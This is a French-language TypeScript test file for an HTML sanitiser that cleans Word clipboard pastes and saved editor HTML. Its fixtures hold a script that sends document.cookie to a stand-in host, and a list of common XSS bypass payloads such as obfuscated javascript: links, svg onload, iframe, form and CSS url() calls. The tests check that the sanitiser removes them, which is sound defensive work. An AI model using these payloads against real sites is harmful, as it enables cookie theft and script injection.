import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { assainirHtml, lienAdmis, nettoyerCollage, nettoyerSortie, problemesHtml, texteDepuisHtml } from "./nettoyageHtml.ts";

/** Fragment tel que Word le place dans le presse-papiers (enveloppe, styles, balises d'espace de noms, conditionnels). */
const COLLAGE_WORD = `<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word">
<head><meta charset="utf-8"><style>p.MsoNormal{margin:0;font-family:"Calibri"} @font-face{src:url(http://distant.example/f.woff)}</style>
<!--[if gte mso 9]><xml><o:OfficeDocumentSettings><o:AllowPNG/></o:OfficeDocumentSettings></xml><![endif]--></head>
<body lang=FR style='tab-interval:35.4pt'>
<!--StartFragment-->
<p class=MsoNormal style='margin-bottom:0cm'><b style='mso-bidi-font-weight:normal'><span style='font-size:12.0pt;color:darkred'>Maître,</span></b><o:p></o:p></p>
<p class=MsoListParagraph style='text-indent:-18.0pt;mso-list:l0 level1 lfo1'><![if !supportLists]><span style='font-family:Symbol'>00B7<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;</span></span><![endif]>Premier point</p>
<p class=MsoNormal><i>Voir</i> <a href="https://www.legifrance.gouv.fr/codes/article" style="color:blue" onclick="vol()">l'article</a>.</p>
<img src="http://suivi.example/pixel.gif" width=1 height=1>
<img src="file:///C:/Users/x/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" v:shapes="Image1">
<script>document.location='http://distant.example/?c='+document.cookie</script>
<p><a href="javascript:alert(1)">piège</a></p>
<!--EndFragment-->
</body></html>`;

describe("nettoyage du texte collé depuis Word", () => {
  it("garde le texte et la mise en forme simple, retire tout le reste", () => {
    const propre = nettoyerCollage(COLLAGE_WORD);
    assert.ok(propre.includes("<b>"), "le gras est gardé");
    assert.ok(propre.includes("<i>Voir</i>"), "l'italique est gardé");
    assert.ok(propre.includes("Maître,"));
    assert.ok(propre.includes("Premier point"));
    assert.ok(propre.includes('<a href="https://www.legifrance.gouv.fr/codes/article">l\'article</a>'));
    assert.deepEqual(problemesHtml(propre), []);
  });

  it("aucun script, aucune image, aucun style, aucun contenu distant", () => {
    const propre = nettoyerCollage(COLLAGE_WORD);
    for (const motif of [/script/iu, /<img/iu, /<style/iu, /distant\.example/iu, /suivi\.example/iu, /file:/iu, /mso-/iu, /MsoNormal/u, /onclick/iu, /<o:/iu, /<!--/u, /@font-face/iu, /url\(/iu, /javascript/iu]) {
      assert.equal(motif.test(propre), false, String(motif));
    }
  });

  it("le lien dangereux perd son adresse mais son texte reste", () => {
    const propre = nettoyerCollage(COLLAGE_WORD);
    assert.ok(propre.includes("piège"));
    assert.equal(propre.includes("<a>piège"), false);
  });

  it("essai négatif : l'ancien texte, avant nettoyage, est bien jugé impropre", () => {
    const problemes = problemesHtml(COLLAGE_WORD);
    assert.ok(problemes.includes("script"));
    assert.ok(problemes.includes("style"));
    assert.ok(problemes.includes("contenu distant ou actif"));
    assert.ok(problemes.includes("gestionnaire d'événement"));
    assert.ok(problemes.includes("commentaire"));
    assert.ok(problemes.includes("schéma actif"));
  });
});

describe("nettoyage : HTML enregistré", () => {
  it("seules les balises de l'éditeur survivent", () => {
    const html = "<h1>Titre</h1><div><p>Un <strong>gras</strong>, un <em>italique</em>.</p><ul><li>un</li><li>deux</li></ul><table><tr><td>cellule</td></tr></table><blockquote><p>cité</p></blockquote></div>";
    assert.equal(
      nettoyerSortie(html),
      "Titre<p>Un <strong>gras</strong>, un <em>italique</em>.</p><ul><li>un</li><li>deux</li></ul>cellule<blockquote><p>cité</p></blockquote>",
    );
  });

  it("un lien garde son adresse admise et perd tout autre attribut", () => {
    assert.equal(
      nettoyerSortie('<p><a href="mailto:a@x.example" target="_blank" rel="x" class="y" style="z">écrire</a></p>'),
      '<p><a href="mailto:a@x.example">écrire</a></p>',
    );
  });

  it("chaque balise ouverte est refermée, une balise fermante orpheline est ignorée", () => {
    assert.equal(nettoyerSortie("<p><strong>gras<p>suite</em></p>"), "<p><strong>gras<p>suite</p></strong></p>");
    assert.equal(nettoyerSortie("texte</p></blockquote>"), "texte");
  });

  it("un chevron isolé ou une entité reste du texte", () => {
    assert.equal(nettoyerSortie("<p>a < b et c > d &amp; e</p>"), "<p>a &lt; b et c &gt; d &amp; e</p>");
  });

  it("essai négatif : les contournements usuels échouent", () => {
    const attaques = [
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<p onmouseover="alert(1)">x</p>',
      '<a href="JaVaScRiPt:alert(1)">x</a>',
      '<a href="java\tscript:alert(1)">x</a>',
      '<a href="&#x6a;avascript:alert(1)">x</a>',
      '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
      '<a href="//distant.example/x">x</a>',
      '<a href="/relatif">x</a>',
      '<svg onload=alert(1)><circle/></svg>',
      '<iframe src="http://distant.example"></iframe>',
      '<style>@import url(http://distant.example/x.css)</style>',
      '<object data="http://distant.example/x"></object>',
      '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
      '<p style="background:url(http://distant.example/x.png)">x</p>',
      '<form action="http://distant.example"><input name=a></form>',
    ];
    for (const attaque of attaques) {
      for (const niveau of ["collage", "sortie"] as const) {
        const propre = assainirHtml(attaque, niveau);
        assert.deepEqual(problemesHtml(propre), [], `${niveau} : ${attaque} → ${propre}`);
        // Du texte inerte peut rester (« ipt>alert(1) ») ; aucune balise ni aucun attribut ne doit porter l'attaque.
        const balises = (propre.match(/<[^>]*>/gu) ?? []).join(" ");
        assert.equal(
          /alert|distant\.example|javascript|data:|onload|onmouseover/iu.test(balises),
          false,
          `${niveau} : ${attaque} → ${propre}`,
        );
      }
    }
  });

  it("un script non fermé fait tout disparaître plutôt que d'en laisser passer une partie", () => {
    const propre = nettoyerSortie("<p>avant</p><script>alert(1)<p>après</p>");
    assert.equal(propre, "<p>avant</p>");
  });

  it("schémas de liens admis", () => {
    assert.equal(lienAdmis("https://exemple.example/a?b=1&c=2"), "https://exemple.example/a?b=1&c=2");
    assert.equal(lienAdmis("mailto:a@x.example"), "mailto:a@x.example");
    assert.equal(lienAdmis("tel:+33100000000"), "tel:+33100000000");
    assert.equal(lienAdmis("ftp://x.example"), null);
    assert.equal(lienAdmis(""), null);
    assert.equal(lienAdmis("exemple.example"), null);
  });

  it("texte brut d'un HTML propre", () => {
    assert.equal(texteDepuisHtml("<p>Bonjour<br>Maître</p><ul><li>un</li><li>deux</li></ul><script>x</script>"), "Bonjour\nMaître\n\nun\n\ndeux");
    assert.equal(texteDepuisHtml("<p>a &amp; b &lt;c&gt;</p>"), "a & b <c>");
  });
});
